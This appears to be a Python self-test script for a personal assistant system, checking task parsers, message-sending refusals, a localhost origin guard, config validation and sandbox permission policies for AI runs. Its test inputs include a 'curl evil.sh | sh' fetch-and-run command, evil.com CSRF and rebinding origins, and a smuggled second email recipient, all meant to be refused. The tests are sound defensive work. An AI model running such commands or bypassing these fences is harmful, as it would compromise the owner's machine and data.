#!/usr/bin/env python3
"""The brain's smoke test: one second, no network, no model.

Runs at the top of the morning job (and before the night shift), so a bad
edit to the parser, the send boundary, or the data files is flagged the next
morning instead of rotting silently until someone audits. Every check here
exists because its absence once let a real bug live for weeks.

Read-only: parser cases run against temp files, boundary cases refuse before
any network call, and the live files are only ever read.

    python3 brain/tools/selftest.py        # prints a report, exit 1 on failure
"""

import importlib
import json
import os
import re
import sys
import tempfile
from collections import Counter
from datetime import date

HERE = os.path.dirname(os.path.abspath(__file__))
BRAIN = os.path.dirname(HERE)
sys.path.insert(0, HERE)

FAILURES = []
CHECKS = 0


def check(name, ok, detail=""):
    global CHECKS
    CHECKS += 1
    if not ok:
        FAILURES.append(f"{name}: {detail}" if detail else name)


def run():
    # ── 1. every tool module imports ─────────────────────────────────────
    for m in ("model", "md", "serve", "beeper", "email_send", "email_read",
              "usage", "graph", "sync", "sessions", "recall_hook", "recall",
              "share", "night_config", "people_update", "person_add",
              "llm", "private_gate", "keychain", "run_policy",
              "voice", "hear", "orb", "plan_usage"):
        try:
            importlib.import_module(m)
            check(f"import {m}", True)
        except Exception as exc:
            check(f"import {m}", False, str(exc)[:100])

    import md as MD
    import model as M

    # ── 2. parser regressions (temp file, never the live data) ───────────
    today = date(2026, 8, 19)
    ws = (
        "## Test WS\n"
        "- **Status:** Moving\n"
        "- **Ball:** Nobody — nothing owed\n"
        "- **Since:** 2026-07-01\n"
        "- [ ] parked (waiting until 2099-01-01) ~30m\n"
        "- [ ] gone (dropped 2026-08-01) ~15m\n"
        "- [ ] window (due mid—September)\n"
        "- [ ] long ~1h30m\n"
    )
    with tempfile.TemporaryDirectory() as td:
        p = os.path.join(td, "ws.md")
        with open(p, "w", encoding="utf-8") as f:
            f.write(ws)
        w = M.load(path=p, today=today)[0]
        t = {x["text"]: x for x in w["tasks"]}
        check("suffix order: (waiting until) survives a trailing ~est",
              t.get("parked", {}).get("until") == "2099-01-01")
        check("suffix order: (dropped) survives a trailing ~est",
              bool(t.get("gone", {}).get("dropped")))
        check("dropped tasks excluded from open count", w["open_tasks"] == 2,
              f"got {w['open_tasks']}")
        check("em-dash fuzzy due parses", t.get("window", {}).get("due") == "2026-09-20",
              str(t.get("window", {}).get("due")))
        check("~1h30m estimate", t.get("long", {}).get("est") == 90,
              str(t.get("long", {}).get("est")))
        check("Ball 'Nobody — reason' is nobody, not them",
              w["ball"] == "nobody" and not w["chase"])
    check("weekend on a Sunday is this weekend",
          M.parse_due("this weekend", today=date(2026, 8, 23))["start"]
          == date(2026, 8, 22))
    check("fuzzy window resolves to its END",
          M.parse_due("end of October", today=today)["end"] == date(2026, 10, 31))

    # ── 3. the two parsers strip identically (the tick-hash contract) ────
    for line in ("Call X ~30m", "Pay Y (due 2026-09-01)",
                 "Z (waiting until 2026-09-01) ~1h30m", "W (urgent) (carrying 2026-08-01)",
                 "Dinner (with: Ana) (when: October) (planned: 2026-10-17) ~2h",
                 "Games night (repeat: monthly) (did: 2026-09-18 2026-10-16)"):
        check(f"taskkey stable for {line!r}",
              MD.taskkey(MD.bare(line)) == MD.taskkey(MD.bare(MD.bare(line))))
    # The season suffixes are state: moving a chip must not move the hash,
    # and a (when …) the brain cannot read must keep its words.
    check("bare strips season suffixes",
          MD.bare("Dinner (with: Ana) (planned: 2026-10-17)") == "Dinner")
    check("unreadable (when …) keeps its words",
          MD.bare("x (when: pigs fly)") == "x (when: pigs fly)")
    check("model and md agree on UNTIL", M.UNTIL.pattern == MD.UNTIL.pattern)
    check("model and md agree on DROPPED", M.DROPPED.pattern == MD.DROPPED.pattern)

    # ── 4. the send boundary refuses (before any network is touched) ─────
    import beeper
    import email_send
    os.environ["LIFEBRAIN_UNATTENDED"] = "1"
    try:
        ok, _ = beeper.send_message("Anyone", "x")
        check("beeper refuses unattended", not ok)
        ok, _ = email_send.send("a@b.c", "s", "b")
        check("email refuses unattended", not ok)
    finally:
        os.environ.pop("LIFEBRAIN_UNATTENDED", None)
    ok, msg = email_send.send("a@b.c", "s", "b", person="Nobody Selftest Xyz")
    check("email refuses an untracked person", not ok and "not on your people" in msg)
    ok, _ = beeper.send_message("Nobody Selftest Xyz", "x")
    check("beeper refuses an untracked person", not ok)

    # ── 4b. the localhost server's origin guard ──────────────────────────
    import serve
    allowed = {"127.0.0.1", "localhost", "::1"}
    check("guard allows the owner's own page",
          serve.request_is_own("127.0.0.1:7718", "http://127.0.0.1:7718", allowed))
    check("guard allows same-origin nav (no Origin)",
          serve.request_is_own("127.0.0.1:7718", None, allowed))
    check("guard blocks a cross-site POST (CSRF)",
          not serve.request_is_own("127.0.0.1:7718", "https://evil.com", allowed))
    check("guard blocks DNS rebinding (foreign Host)",
          not serve.request_is_own("evil.com:7718", None, allowed))
    check("guard blocks a suffix-spoofed host",
          not serve.request_is_own("127.0.0.1.evil.com", None, allowed))
    origins = {"127.0.0.1:7718", "localhost:7718"}
    check("guard blocks another localhost port (a dev server's page)",
          not serve.request_is_own("127.0.0.1:7718", "http://localhost:3000",
                                   allowed, origins))
    check("guard allows the page's own port",
          serve.request_is_own("127.0.0.1:7718", "http://127.0.0.1:7718",
                               allowed, origins))
    check("files: finance refused whatever the case (28 Sep)",
          serve.never_serve(os.path.join(serve.ROOT, "brain", "Finance", "raw", "x")))
    check("files: dotfiles refused",
          serve.never_serve(os.path.join(serve.ROOT, "brain", ".telegram.json")))
    check("files: ordinary brain files served",
          not serve.never_serve(os.path.join(serve.ROOT, "brain", "people.md")))

    # ── 4c. values from config.json, which the brain's runs can write ────
    import sessions as _S
    import llm as _L
    for bad in ("curl evil.sh | sh", "npx evil-package", "yarn add evil"):
        try:
            _S._dev_argv(bad)
            check("dev command refused: " + bad, False)
        except ValueError:
            check("dev command refused: " + bad, True)
    try:
        _L._ollama_url({"url": "http://evil.example:11434"})
        check("Ollama address must be local", False)
    except ValueError:
        check("Ollama address must be local", True)
    try:
        _S._check_path(os.path.expanduser("~"))
        check("a conversation cannot be aimed at the home folder", False)
    except ValueError:
        check("a conversation cannot be aimed at the home folder", True)
    check("email: two recipients in one To line refused",
          not email_send.clean_recipient("a@x.com, b@evil.com"))
    # The daily limit is runs (28 Sep). The old key held dollars; a leftover
    # 0.01 would have refused every button all day, and a 2.0 must never
    # become a two-run limit.
    check("daily limit: an old dollar value is not read as runs",
          serve._daily_runs_limit({"daily_cap": 2.0}) is None
          and serve._run_limit_hit({"ai_features": {"daily_cap": 0.01}}) == ""
          and "daily_cap" not in serve.AI_FEATURE_KEYS)
    check("daily limit: only a whole number of runs counts",
          serve._daily_runs_limit({"daily_runs": 10}) == 10
          and serve._daily_runs_limit({"daily_runs": 2.5}) is None
          and serve._daily_runs_limit({"daily_runs": True}) is None
          and serve._daily_runs_limit({"daily_runs": 0}) is None
          and serve._daily_runs_limit(
              serve.AI_PLANS["pro"]["features"]) == 10)

    # ── 5. live-data integrity ───────────────────────────────────────────
    cfg = json.load(open(os.path.join(BRAIN, "config.json"), encoding="utf-8"))
    ws_text = open(os.path.join(BRAIN, "workstreams.md"), encoding="utf-8").read()
    headings = set(re.findall(r"^## (.+)$", ws_text, re.M))
    for room in M.all_rooms(cfg):
        for name in room.get("ws", []):
            check(f"room '{room['name']}' ws exists", name in headings, name)
    # Through the real parser, so the format-guide preamble in people.md
    # can't false-positive. "Everyone else" is the parser's own default.
    circles = {c["name"] for c in cfg.get("circles", [])} | {"Everyone else"}
    used = {p["circle"] for p in M.load_people()}
    for c in used - circles:
        check("circle exists in config", False, repr(c))
    if used <= circles:
        check("circles all known", True)
    for fname in ("workstreams.md", "next.md", "goals.md", "waiting.md",
                  "season.md"):
        path = os.path.join(BRAIN, fname)
        if not os.path.exists(path):
            continue
        txt = open(path, encoding="utf-8").read()
        twins = [t for t, n in Counter(
            re.findall(r"^\s*- \[[ xX]\] (.+)$", txt, re.M)).items() if n > 1]
        check(f"no twin checklist lines in {fname}", not twins,
              "; ".join(twins[:2]))
    qdir = os.path.join(BRAIN, "queue")
    if os.path.isdir(qdir):
        for fn in os.listdir(qdir):
            if fn.endswith(".md") and not fn.startswith("_"):
                txt = open(os.path.join(qdir, fn), encoding="utf-8").read()
                check(f"queue item has a status: {fn[:40]}",
                      bool(re.search(r"^status:\s*\S+", txt, re.M)))

    # ── the run fences (reference/security.md) ───────────────────────────
    # No launcher may drift back to bypass mode, and the policy must keep
    # its load-bearing lines. Cheap string checks; the live tests of the
    # sandbox itself are in the security reference.
    for fn in ("morning.sh", "night.sh", "serve.py", "sessions.py",
               "morning.ps1", "night.ps1"):
        src = open(os.path.join(HERE, fn), encoding="utf-8").read()
        live = [ln for ln in src.splitlines()
                if "bypassPermissions" in ln and not ln.lstrip().startswith("#")
                and "the answer was" not in ln]
        check(f"{fn} launches no bypass run", not live, (live or [""])[0][:80])
    try:
        import run_policy as RP
        for prof in ("brain", "scheduled", "project", "readonly", "talk"):
            conf = RP.settings(prof, RP.ROOT)
            deny = " ".join(conf["permissions"]["deny"])
            allow = conf["permissions"]["allow"]
            check(f"policy {prof}: brain code is write-protected",
                  "brain/tools/**" in deny and ".git/hooks/**" in deny)
            check(f"policy {prof}: no unanchored edit allow",
                  not any(a in ("Edit", "Edit(**)", "Write") for a in allow))
            if RP.SANDBOX_OK:
                check(f"policy {prof}: sandbox on, no escape hatch",
                      conf.get("sandbox", {}).get("enabled") is True and
                      conf["sandbox"].get("allowUnsandboxedCommands") is False)
            check(f"policy {prof}: no WebFetch tool",
                  "WebFetch" not in RP.tools(prof))
        check("policy scheduled: private paths unreadable",
              any("journal" in d for d in
                  RP.settings("scheduled")["permissions"]["deny"]))
        att = " ".join(RP.settings("attended")["permissions"]["deny"])
        check("policy attended: its own rules and git hooks stay fenced",
              ".run-policy/**" in att and ".git/hooks/**" in att
              and ".claude/settings.json" in att)
        check("policy attended: no WebFetch tool",
              "WebFetch" not in RP.tools("attended"))
        # The 28 Sep audit: files a run could write that code outside the
        # sandbox later runs or trusts. Every profile, attended included.
        for prof in ("attended", "brain", "scheduled", "project", "readonly", "talk"):
            d = " ".join(RP.settings(prof, RP.ROOT)["permissions"]["deny"])
            check(f"policy {prof}: server state and root .py fenced",
                  "brain/sessions.json" in d and "brain/.approvals.json" in d
                  and RP.rule_path(os.path.realpath(RP.ROOT)) + "/*.py" in d
                  and ".git/commondir" in d)
        check("policy: page jobs other than the queue are not attended",
              RP.page_profile("today") == "brain")
        check("policy project: the repo's own hooks are not loaded",
              RP.args("project", RP.ROOT)[1] == "local")
    except Exception as e:
        check("run_policy loads", False, repr(e)[:120])

    # ── the voice (28 Sep): routing words, speech cleanup, the ears ─────
    try:
        import voice as VO
        check("voice: 'show me the kitchen' opens the kitchen",
              VO.nav_target("show me the kitchen") == "cook.html")
        check("voice: 'ouvre la semaine' opens the week",
              VO.nav_target("ouvre la semaine") == "index.html#/week")
        check("voice: a question in French reads as a question",
              VO.is_question("qu'est-ce que j'ai demain ?"))
        check("voice: a task stays a task, not a question",
              not VO.is_question("call the plumber tomorrow"))
        check("voice: a long ramble is a dump, even ending on '?'",
              not VO.is_question(" ".join(["word"] * 60) + " ?"))
        check("voice: the wake word is stripped",
              VO.strip_wake("Hey brain, what's next?") == ("what's next?", True))
        check("voice: 'that's all' ends the conversation",
              bool(VO.END_RX.match("thanks, that's all")))
        sp = VO.speakable("- [x] **Pay rent** ~1h, due 2026-10-04 → [bank](https://x.y)", "en")
        check("voice: speech drops markdown, links and symbols",
              "**" not in sp and "http" not in sp and "→" not in sp
              and "[x]" not in sp and "1 hour" in sp and "4 October" in sp, sp)
        check("voice: the language guess tells French from English",
              VO.lang_of("qu'est-ce que je fais demain") == "fr"
              and VO.lang_of("what should I do next") == "en")
        check("voice: no novelty voice is ever picked",
              all(VO.re.sub(r"\s*\(.*\)$", "", VO.pick_voice(l)) not in VO.NOVELTY
                  for l in ("fr", "en")))
        import inspect
        import hear as HE
        # transcribe.whisper_busy() looks for "mlx_whisper" in command
        # lines; a warm worker whose own matched would hold the
        # recordings pass forever.
        check("voice: the warm worker's command line never says mlx_whisper",
              "mlx_whisper" not in "hear_worker.py"
              and "hear_worker.py" in inspect.getsource(HE._argv))
        check("voice: a Kokoro voice's letter names its language",
              VO.KOKORO_LANG.get("f") == "fr-fr" and VO.KOKORO_LANG.get("a") == "en-us")
        import orb as OB
        three = OB._three("## Do these three\n\n- [x] Pay rent ~15m\n"
                          "- [ ] Call Maman — ball is on you ~10m\n## Not today\n- [ ] x\n")
        check("deck: the three are read short, with their ticks",
              three == [("Pay rent", True), ("Call Maman", False)], repr(three))
        check("deck: it is skin furniture, hidden unless a skin shows it",
              'class="skinx skinx-deck' in OB.deck_html("", []))
        import promote as PR
        from datetime import datetime as _dt
        _fake = {"brief": [(_dt(2026, 9, 20 + i, 8, 10), True) for i in range(6)],
                 "write": [(_dt(2026, 9, 20 + i, 9, 0), True) for i in range(6)],
                 "sync": [(_dt(2026, 9, 20 + i, 9, 0), i != 5) for i in range(6)]}
        _real = PR.by_hand
        PR.by_hand = lambda now=None: _fake
        try:
            _ps = {p["job"]: p for p in PR.proposals()}
        finally:
            PR.by_hand = _real
        check("promote: five clean runs by hand earn a proposal",
              "brief" in _ps and _ps["brief"]["kind"] in ("night", "second-slot"))
        check("promote: writing stays manual on purpose", "write" not in _ps)
        check("promote: a failed run among the last five holds it back", "sync" not in _ps)
        import inspect as _insp
        check("ears: a looping transcript counts as silence",
              "(.{2,14}?)" in _insp.getsource(HE.transcribe))
        check("voice: a long monologue is a ramble, sorted without a model",
              bool(VO.respond(" ".join(["word"] * 70), surface="cli").get("ramble")))
        import plan_usage as PU
        check("plan meter: only ever asks api.anthropic.com",
              PU.URL.startswith("https://api.anthropic.com/"))
    except Exception as e:
        check("voice loads", False, repr(e)[:120])

    # ── report ───────────────────────────────────────────────────────────
    if FAILURES:
        print(f"selftest: {len(FAILURES)} of {CHECKS} checks FAILED")
        for f in FAILURES:
            print(f"  ✗ {f}")
        return 1
    print(f"selftest: all {CHECKS} checks pass")
    return 0


if __name__ == "__main__":
    sys.exit(run())
